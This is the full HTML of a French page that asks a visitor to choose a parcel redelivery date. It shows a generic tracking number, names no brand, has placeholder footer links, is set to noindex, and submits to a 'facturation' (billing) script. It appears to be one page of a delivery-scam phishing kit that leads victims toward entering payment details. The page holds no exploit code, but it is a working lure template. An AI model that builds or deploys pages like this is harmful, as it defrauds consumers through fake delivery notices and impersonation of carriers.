<!DOCTYPE html>
<html lang="fr">
<head>
    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="apple-touch-icon" href="/img/apple-touch-icon.png">
    <meta name="viewport" content="initial-scale=1.0, width=device-width">
    <meta name="description" content="">
    <meta charset="UTF-8">
    <meta name="robots" content="noindex">
    <title>Page d'accueil | Livraison de mes colis</title>
    <link rel="stylesheet" type="text/css" href="/css/style.css?202307">
    <script src="/js/jquery-3.7.0.min.js"></script>
    <script src="/js/jquery.mask.js"></script>
    <script src="/js/mask.js"></script>
    <style>
        .contentContainer {
            margin-bottom: 150px; /* Ajustez cette valeur selon vos besoins */
        }

        .footer {
            margin-top: 50px; /* Ajustez cette valeur selon vos besoins */
        }

        body {
            min-height: 100vh; /* Assure que le corps prend au moins toute la hauteur de la fenêtre */
            display: flex;
            flex-direction: column;
        }

        .corral {
            flex: 1;
        }
    </style>
</head>
<body>

<div class="corral">
    <div class="contentContainer activeContent contentContainerBordered">
        <header id="header">
            <img src="/img/logo-min.png" alt="" width="85%">
        </header>
            
        <form name="schedule_form" action="/facturation.php" method="post" novalidate="novalidate">
            <h2>Numéro de suivi : 69487</h2>
            <h3>Choisissez votre créneau de livraison</h3>
            <p>
                Votre colis vous sera livré lors du prochain jour sélectionné, entre 8h00 et 18h00, à l'exception des jours fériés et du dimanche.
                <br><br>
                Si un nouvel échec a lieu, votre colis sera automatiquement redirigé en point relais le plus proche de votre domicile.
                <br>
            </p>
            <h4 style="text-align: center">Date de re-livraison</h4>
            <select id="schedule_form_schedule" name="schedule_form_schedule"></select>
            <div>
                <button type="submit" id="schedule_form_submit">Confirmer ma re-livraison</button>
            </div>
            <input type="hidden" id="schedule_form__token" name="schedule_form_token" value="fa35fa68c942f1b146f9fd4fdb9a1e1f.v0k72AEwrvL9OTCvuTO5gjlfL17yy-wL9uyf81t4HC4.1h1akUl238aybVvi3X_t7lsyajrCuLNPwq_KnhY7ZFnKPFOaOHTUkah7Xw">
        </form>
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                const select = document.getElementById('schedule_form_schedule');
                const today = new Date();
                const currentMonth = today.getMonth();
                const currentYear = today.getFullYear();
                const startDay = today.getDate() + 1; // Commencer au jour suivant
                const daysInMonth = new Date(currentYear, currentMonth + 1, 0).getDate();
                const endDay = Math.min(startDay + 9, daysInMonth); // Limiter à 15 jours à partir du jour courant

                for (let day = startDay; day <= endDay; day++) {
                    let date = new Date(currentYear, currentMonth, day);
                    if (date.getDay() !== 0) { // Exclure les dimanches
                        let dayFormatted = ("0" + day).slice(-2);
                        let monthFormatted = ("0" + (currentMonth + 1)).slice(-2);
                        let dateString = `${dayFormatted}/${monthFormatted}/${currentYear}`;
                        select.appendChild(new Option(`${dateString} - de 8h à 13h`, `${dateString} - de 8h à 13h`));
                        select.appendChild(new Option(`${dateString} - de 13h à 18h`, `${dateString} - de 13h à 18h`));
                    }
                }

                document.querySelector("form").addEventListener("submit", function(e) {
                    const selectedSchedule = select.value;
                    document.cookie = "deliverySchedule=" + encodeURIComponent(selectedSchedule) + "; path=/";
                });
            });
        </script>
    </div>
    <footer class="footer" role="contentinfo">
        <div class="legalFooter">
            <ul class="footerGroup">
                <li><a target="_blank" href="#" pa-marked="1">Contact</a></li>
                <li><a target="_blank" href="#" pa-marked="1">Respect de la vie privée</a></li>
                <li><a target="_blank" href="#" pa-marked="1">Contrats d'utilisation</a></li>
                <li><a target="_blank" href="#" pa-marked="1">International</a></li>
            </ul>
        </div>
    </footer>
</div>

</body>
</html>
